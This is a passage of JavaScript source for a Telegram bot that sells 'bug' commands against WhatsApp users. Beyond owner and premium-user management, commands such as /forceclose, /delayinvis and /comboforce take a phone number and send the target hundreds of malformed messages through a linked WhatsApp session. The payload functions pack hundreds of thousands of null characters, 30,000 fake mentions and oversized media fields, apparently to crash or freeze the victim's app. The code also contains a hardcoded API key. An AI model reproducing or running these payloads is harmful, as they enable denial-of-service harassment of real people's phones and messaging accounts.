      return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
  }

  let userId;

  if (ctx.message.reply_to_message) {
      userId = ctx.message.reply_to_message.from.id.toString();
  } else {
      const args = ctx.message.text.split(" ")[1];
      if (!args) {
          return await ctx.reply(`❌ Format perintah salah. Gunakan: /delowner <id>`);
      }

      if (args.startsWith("@")) {
          try {
              const username = args.slice(1);
              const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
              userId = chatMember.user.id.toString();
          } catch (error) {
              return await ctx.reply("❌ Username tidak ditemukan atau bukan member dari grup ini.");
          }
      } else {
          if (!/^\d+$/.test(args)) {
              return await ctx.reply("❌ ID harus berupa angka!");
          }
          userId = args;
      }
  }

  if (!ownerList.includes(userId)) {
      return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai owner.`);
  }

  try {
      const user = await ctx.telegram.getChat(userId);
      ownerList = ownerList.filter(id => id !== userId);
      await saveOwnerList();

      const successMessage = `
╭──「  𝗗𝗘𝗟𝗘𝗧𝗘 𝗢𝗪𝗡𝗘𝗥 」
┃ ✅ BERHASIL DELETE OWNER 
┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗨𝘀𝗲𝗿:
┃ • ID: ${userId}
┃ • Username: ${user.username ? '@' + user.username : 'Tidak ada'}
╰─────────────────`;

      await ctx.replyWithMarkdown(successMessage, {
          reply_markup: {
              inline_keyboard: [
                  [{ text: "❌ Close", callback_data: "close" }]
              ]
          }
      });
  } catch (error) {
      console.error('Error removing owner:', error);
      await ctx.reply("❌ Gagal menghapus owner. Pastikan ID/Username valid.");
  }
});


// Command /addprem - Menambahkan user premium
bot.command("addprem", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const args = ctx.message.text.split(" ");
    let userId;
    let durationDays;

    // Parse durasi dari argument terakhir
    durationDays = parseInt(args[args.length - 1]);
    if (isNaN(durationDays) || durationDays <= 0) {
      return await ctx.reply(`
┏━━━❰ Tutorial Addowner ❱━━━
┣⟣ Format tidak valid!
┣⟣ Contoh: /addowner <user_id> <Durasi>
┣⟣ Durasi: 
┃  • 30d (30 hari)
┃  • 24h (24 jam)
┃  • 1m (1 bulan)
┗━━━━━━━━━━━━━━━`);
    }

    // Jika command merupakan reply ke pesan
    if (ctx.message.reply_to_message) {
        userId = ctx.message.reply_to_message.from.id.toString();
    } 
    // Jika ada username/mention atau ID yang diberikan
    else if (args.length >= 3) {
        const userArg = args[1];
        
        // Jika input adalah username (dimulai dengan @)
        if (userArg.startsWith("@")) {
            try {
                const username = userArg.slice(1);
                const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
                userId = chatMember.user.id.toString();
            } catch (error) {
                console.log("Error getting user by username:", error);
                userId = null;
            }
        } 
        // Jika input adalah ID langsung
        else {
            userId = userArg.toString();
        }
    }

    if (!userId) {
        return await ctx.reply("❌ Tidak dapat menemukan user. Pastikan ID/Username valid.");
    }

    try {
        // Tambahkan user ke premium
        addPremiumUser(userId, durationDays);

        const expirationDate = premiumUsers[userId].expired;
        const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');

        const successMessage = `
╭──「  𝗔𝗗𝗗 𝗣𝗥𝗘𝗠 」
┃ ✅ BERHASIL MENAMBAH PREM
┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗣𝗿𝗲𝗺𝗶𝘂𝗺:
┃ • ID: ${userId}
┃ • Durasi: ${durationDays} hari
┃ • Expired: ${formattedExpiration} WIB
╰─────────────────`;

        await ctx.replyWithMarkdown(successMessage, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "❌ Close", callback_data: "close" }]
                ]
            }
        });

    } catch (error) {
        console.error('Error adding premium:', error);
        await ctx.reply("❌ Gagal menambahkan premium. Silakan coba lagi.");
    }
});






const prosesrespone = async (target, ctx) => {
  const caption = `
「 ✅ Bug Ganas Send To Successfully 」
┏━━━━━━━━━━━━━━━━━━━━━━━━❍
┃╭────────────────────
┃│ Target Nomor : wa.me/${target.split("@") [0]}
┃╰────────────────────
┗━━━━━━━━━━━━━━━━━━━━━━━❍
Sudah Bug Tolong Jeda 5-10 Menitan, Biar Sender Bug Tidak Kenon.
 `;

  try {
      await ctx.replyWithPhoto("https://files.catbox.moe/fo6ov1.jpg", {
          caption: caption,
          parse_mode: "Markdown"
      });
      console.log(chalk.blue.bold(`[✓] Process attack target: ${target}`));
  } catch (error) {
      console.error(chalk.red.bold('[!] Error sending process response:', error));
      // Fallback to text-only message if image fails
      await ctx.reply(caption, { parse_mode: "Markdown" });
  }
};

const donerespone = async (target, ctx) => {
  // Get random hexcolor for timestamp
  const hexColor = '#' + Math.floor(Math.random()*16777215).toString(16);
  const timestamp = moment().format('HH:mm:ss');
  
  try {
    // Fetch kata ilham dari API
    const response = await axios.get('https://api.betabotz.eu.org/api/random/katailham?apikey=Btz-kp72a');
    const kataIlham = response.data.hasil;
 
    const caption = `
「 ✅ Bug Ganas Send To Successfully 」
┏━━━━━━━━━━━━━━━━━━━━━━━━❍
┃╭────────────────────
┃│ Target Nomor : wa.me/${target.split("@") [0]}
┃╰────────────────────
┗━━━━━━━━━━━━━━━━━━━━━━━❍
Sudah Bug Tolong Jeda 5-10 Menitan, Biar Sender Bug Tidak Kenon.
`;
 
    await ctx.replyWithPhoto("https://files.catbox.moe/fo6ov1.jpg", {
        caption: caption,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [
                [{ text: "〆 Close", callback_data: "close" }]
            ]
        }
    });
    console.log(chalk.green.bold(`[✓] Attack in succes target: ${target}`));
  } catch (error) {
      console.error(chalk.red.bold('[!] Error:', error));
      // Fallback message tanpa quotes jika API error
      const fallbackCaption = `
「 ✅ Bug Ganas Send To Successfully 」
┏━━━━━━━━━━━━━━━━━━━━━━━━❍
┃╭────────────────────
┃│ Target Nomor : wa.me/${target.split("@") [0]}
┃╰────────────────────
┗━━━━━━━━━━━━━━━━━━━━━━━❍
Sudah Bug Tolong Jeda 5-10 Menitan, Biar Sender Bug Tidak Kenon.
`; 
 
      await ctx.reply(fallbackCaption, {
          parse_mode: "Markdown",
          reply_markup: {
              inline_keyboard: [
                  [{ text: "〆 Close", callback_data: "close" }]
              ]
          }
      });
  }
 };

const checkWhatsAppConnection = async (ctx, next) => {
    if (!isWhatsAppConnected) {
        await ctx.reply("❌ WhatsApp belum terhubung. Silakan gunakan command /addpairing");
        return;
    }
    await next();
};

const QBug = {
  key: {
    remoteJid: "p",
    fromMe: false,
    participant: "0@s.whatsapp.net"
  },
  message: {
    interactiveResponseMessage: {
      body: {
        text: "Sent",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
        version: 3
      }
    }
  }
};

bot.use(checkMaintenance); // Middleware untuk mengecek maintenance
// 

bot.command("delayinvis", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
      return await ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  for (let i = 0; i < 100; i++) {
        await protocolbug2(target, true)
        await sleep(3000)
    
}

  await donerespone(target, ctx);
});

bot.command("delaymention", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
      return await ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  for (let i = 0; i < 200; i++) {
        await protocolbug2(target, true)
        await sleep(3000)
    
}

  await donerespone(target, ctx);
});

bot.command("delayresponse", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
      return await ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  for (let i = 0; i < 300; i++) {
        await InVisibleX1(target, true);
    
}

  await donerespone(target, ctx);
});

bot.command("forcestatus", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
      return await ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  for (let i = 0; i < 300; i++) {
    await protocolbug3(target, true)
    await sleep(3000)
    
}

  await donerespone(target, ctx);
});

bot.command("forceclose", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
      return await ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  for (let i = 0; i < 500; i++) {
    await FChyUi(target);
    await FChyUi(target);
    await FChyUi(target);
    
}

  await donerespone(target, ctx);
});

bot.command("comboforce", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
      return await ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  for (let i = 0; i < 500; i++) {
    await FChyUi(target);
    await aswFChyui(target);
    await FChyUi(target);
    
}

  await donerespone(target, ctx);
});

bot.start(async (ctx) => {
  await ctx.telegram.sendChatAction(ctx.chat.id, 'typing');

  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);
//Runtime Module
    const waktuRunPanel = getUptime(); // Waktu uptime panel
        
  const mainMenuMessage = `\`\`\`
╭━𓊈 𝐓𝐑𝐀𝐙 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𓊉━═╣
║𝙱𝙾𝚃 𝙽𝙰𝙼𝙴 : 𝚃𝚁𝙰𝚉 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂
┃𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝟸.𝟺
║𝚁𝚄𝙽𝚃𝙸𝙼𝙴 : ${waktuRunPanel}
╰━━━━━━━━━━━━━━━━━━━━━━━━━═╣
╭━━━━━━━━━━━━━━━━━━━━━
┃𝙾𝚆𝙽𝙴𝚁 𝙾𝙽𝙴 >> t.me/kipopLecy
┃𝙾𝚆𝙽𝙴𝚁 𝚃𝚆𝙾 >> t.me/kurozi21
┃𝙾𝚆𝙽𝙴𝚁 𝚃𝚁𝙴𝙴 >> t.me/Zyrexoffc
┃𝙾𝚆𝙽𝙴𝚁 𝙵𝙾𝚁𝚁 >> t.me/Osaka_Real
╰━━━━━━━━━━━━━━━━━━━━━

╭────────────────────
│[ 𝚂𝙴𝙻𝙴𝙲𝚃 𝙱𝚄𝚃𝚃𝙾𝙽 𝙼𝙴𝙽𝚄 ]
╰────────────────────
\`\`\``;

const mainKeyboard = [
    [{
      text: "『 𝐎𝐖𝐍𝐄𝐑 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 』", 
      callback_data: "owner_menu"
    }, 
    {
      text: "『 𝐁𝐔𝐆 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 』",
      callback_data: "bug_menu"
    }], 
    [{
      text: "[+ 𝙾𝚆𝙽𝙴𝚁 𝙲𝙾𝙽𝚃𝙰𝙲𝚃 +]", 
      url: "https://t.me/kipopLecy"
    }, 
    {
      text: "[+ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 +]", 
      url: "https://t.me/traz_Invictus"
    }]
  ];

  setTimeout(async () => {
    await ctx.replyWithPhoto("https://files.catbox.moe/zrq1px.jpg", {
      caption: mainMenuMessage,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
  }, 1000);
});

// Handler untuk callback "owner_management"
bot.action('owner_menu', async (ctx) => {
  await ctx.deleteMessage();
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);  
//Runtime Module
    const waktuRunPanel = getUptime(); // Waktu uptime panel
    
  const mainMenuMessage = `\`\`\`
╭━𓊈 𝐓𝐑𝐀𝐙 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𓊉━═╣
║𝙱𝙾𝚃 𝙽𝙰𝙼𝙴 : 𝚃𝚁𝙰𝚉 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂
┃𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝟸.𝟺
║𝚁𝚄𝙽𝚃𝙸𝙼𝙴 : ${waktuRunPanel}
╰━━━━━━━━━━━━━━━━━━━━━━━━━═╣
  
┏━━『 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 』
╿☐ ⧽ /ᴀᴅᴅᴀᴅᴍɪɴ × ɪᴅ
╽☐ ⧽ /ᴅᴇʟᴀᴅᴍɪɴ × ɪᴅ
╿☐ ⧽ /ᴀᴅᴅᴏᴡɴᴇʀ x ɪᴅ
╽☐ ⧽ /ᴅᴇʟᴏᴡɴᴇʀ x ɪᴅ
╿☐ ⧽ /ᴀᴅᴅᴘʀᴇᴍ x ɪᴅ
╽☐ ⧽ /ᴅᴇʟᴘʀᴇᴍ x ɪᴅ
╿☐ ⧽ /ᴄᴏɴɴᴇᴄᴛ x ɴᴏᴍᴏʀ
┕━━━━━━━━━━━━━━━━━━━━━━━━━━
\`\`\``;

  const mainKeyboard = [
    [{
      text: "𝙱𝙰𝙲𝙺",
      callback_data: "back"
    }, 
    {
      text: "『 𝐀𝐃𝐌𝐈𝐍 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 』", 
      callback_data: "admin_menu"
    }]
  ];

  await ctx.replyWithPhoto("https://files.catbox.moe/81jghp.jpg", {
      caption: mainMenuMessage,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
});

bot.action('admin_menu', async (ctx) => {
  await ctx.deleteMessage();
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
//Runtime Module
    const waktuRunPanel = getUptime(); // Waktu uptime panel
    
  const mainMenuMessage = `\`\`\`
╭━𓊈 𝐓𝐑𝐀𝐙 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𓊉━═╣
║𝙱𝙾𝚃 𝙽𝙰𝙼𝙴 : 𝚃𝚁𝙰𝚉 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂
┃𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝟸.𝟺
║𝚁𝚄𝙽𝚃𝙸𝙼𝙴 : ${waktuRunPanel}
╰━━━━━━━━━━━━━━━━━━━━━━━━━═╣
  
┏━━『 𝗔𝗗𝗠𝗜𝗡 𝗠𝗘𝗡𝗨 』
╿☐ ⧽ /ᴀᴅᴅᴘʀᴇᴍ x ɪᴅ
╽☐ ⧽ /ᴅᴇʟᴘʀᴇᴍ x ɪᴅ
┕━━━━━━━━━━━━━━━━━━━━━━━━━━
\`\`\``;

  const mainKeyboard = [
    [{
      text: "𝙱𝙰𝙲𝙺 [ 𝙼𝙴𝙽𝚄 ]",
      callback_data: "back"
    }, 
    {
      text: "𝙱𝙰𝙲𝙺 [ 𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄 ]",
      callback_data: "owner_menu"
    }]
  ];

  await ctx.replyWithPhoto("https://files.catbox.moe/81jghp.jpg", {
      caption: mainMenuMessage,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
});

bot.action('bug_menu', async (ctx) => {
  await ctx.deleteMessage();
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);  
//Runtime Module
    const waktuRunPanel = getUptime(); // Waktu uptime panel
    
  const mainMenuMessage = `\`\`\`  
╭━𓊈 𝐓𝐑𝐀𝐙 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𓊉━═╣
║𝙱𝙾𝚃 𝙽𝙰𝙼𝙴 : 𝚃𝚁𝙰𝚉 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂
┃𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝟸.𝟺
║𝚁𝚄𝙽𝚃𝙸𝙼𝙴 : ${waktuRunPanel}
╰━━━━━━━━━━━━━━━━━━━━━━━━━═╣
  
┏━━『 𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 』
╿☐ ⧽ /ᴅᴇʟᴀʏɪɴᴠɪs × ɴᴏ
╽☐ ⧽ /ᴅᴇʟᴀʏᴍᴇɴᴛɪᴏɴ × ɴᴏ
╽☐ ⧽ /ᴅᴇʟᴀʏʀᴇsᴘᴏɴsᴇ × ɴᴏ
╿☐ ⧽ /ғᴏʀᴄᴇᴄʟᴏsᴇ × ɴᴏ
╽☐ ⧽ /ғᴏʀᴄᴇsᴛᴀᴛᴜs  × ɴᴏ
╿☐ ⧽ /ᴄᴏᴍʙᴏғᴏʀᴄᴇ × ɴᴏ
┕━━━━━━━━━━━━━━━━━━━━━━━━━━
\`\`\``;
  
const mainKeyboard = [
    [{
      text: "𝙱𝙰𝙲𝙺",
      callback_data: "back"
    }]
  ];


  await ctx.replyWithPhoto("https://files.catbox.moe/kzk3dp.jpg", {
      caption: mainMenuMessage,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
})

// Handler untuk callback "main_menu"
bot.action('back', async (ctx) => {
  await ctx.deleteMessage();
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);  
//Runtime Module
    const waktuRunPanel = getUptime(); // Waktu uptime panel
 
  const mainMenuMessage = `\`\`\` 
╭━𓊈 𝐓𝐑𝐀𝐙 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𓊉━═╣
║𝙱𝙾𝚃 𝙽𝙰𝙼𝙴 : 𝚃𝚁𝙰𝚉 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂
┃𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝟸.𝟺
║𝚁𝚄𝙽𝚃𝙸𝙼𝙴 : ${waktuRunPanel}
╰━━━━━━━━━━━━━━━━━━━━━━━━━═╣
╭━━━━━━━━━━━━━━━━━━━━━
┃𝙾𝚆𝙽𝙴𝚁 𝙾𝙽𝙴 >> t.me/kipopLecy
┃𝙾𝚆𝙽𝙴𝚁 𝚃𝚆𝙾 >> t.me/kurozi21
┃𝙾𝚆𝙽𝙴𝚁 𝚃𝚁𝙴𝙴 >> t.me/Zyrexoffc
┃𝙾𝚆𝙽𝙴𝚁 𝙵𝙾𝚁𝚁 >> t.me/Osaka_Real
╰━━━━━━━━━━━━━━━━━━━━━

╭────────────────────
│[ 𝚂𝙴𝙻𝙴𝙲𝚃 𝙱𝚄𝚃𝚃𝙾𝙽 𝙼𝙴𝙽𝚄 ]
╰────────────────────
\`\`\``;

const mainKeyboard = [
    [{
      text: "『 𝐎𝐖𝐍𝐄𝐑 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 』", 
      callback_data: "owner_menu"
    }, 
    {
      text: "『 𝐁𝐔𝐆 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 』",
      callback_data: "bug_menu"
    }], 
    [{
      text: "[+ 𝙾𝚆𝙽𝙴𝚁 𝙲𝙾𝙽𝚃𝙰𝙲𝚃 +]", 
      url: "https://t.me/kipopLecy"
    }, 
    {
      text: "[+ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 +]", 
      url: "https://t.me/traz_Invictus"
    }]
  ];
 
  await ctx.replyWithPhoto("https://files.catbox.moe/zrq1px.jpg", {
    caption: mainMenuMessage,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: mainKeyboard
    }
  });
 });

//[ FUNCTION BUG ^^^ ]

let venomModsData = JSON.stringify({
    status: true,
    criador: "VenomMods",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib,,dirty": ["Array"] },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
            }
        }
    }
});

async function aswFChyui(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
            },
            body: {
              text: "𝙳𝚄𝙰𝚁 [ 𝟷 ] 💥",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: venomModsData + "𝐇𝐲𝐔𝐢𝐅𝐂",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: venomModsData + "\u0003",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await kipop.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}


async function protocolbug2(isTarget, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "FINFIXTER‌‌-‣ ",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(isTarget, generateMessage, {});

    await kipop.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await kipop.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "𝐁𝐞𝐭𝐚 𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 - 𝟗𝟕𝟒𝟏" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function InVisibleX1(target, show) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "𑲭𑲭𝘼𝙍𝙂𝘼 𝙄𝙉𝙑𝙄𝙕𐎟𑆻",
                    footerText: "𝘼𝙍𝙂𝘼 𝙊𝙁𝙁 ",
                    buttons: [
                        {
                            buttonId: ".aboutb",
                            buttonText: {
                                displayText: "𐎟𑆻𝘼𝙍𝙂𝘼 𝙄𝙉𝙑𝙄𝙎 𐎟𑆻 " + "\u0000".repeat(900000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await kipip.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await kipip.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 15,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "𐎟𑆻𝘼𝙍𝙂𝘼 𝙄𝙉𝙑𝙄𝙎𐎟𑆻⃔‌",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }

async function protocolbug3(isTarget, mention) {
    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "鈳� 饾悈 饾悽蜏廷蜖虌汀汀谈谭谭谭蜏廷 饾悕 饾悎 饾悧蜏廷-鈥�",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: ".Tama Ryuichi" + "貍賳貎貏俳貍賳貎".repeat(100),
                                    title: "Finix",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await kipop.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
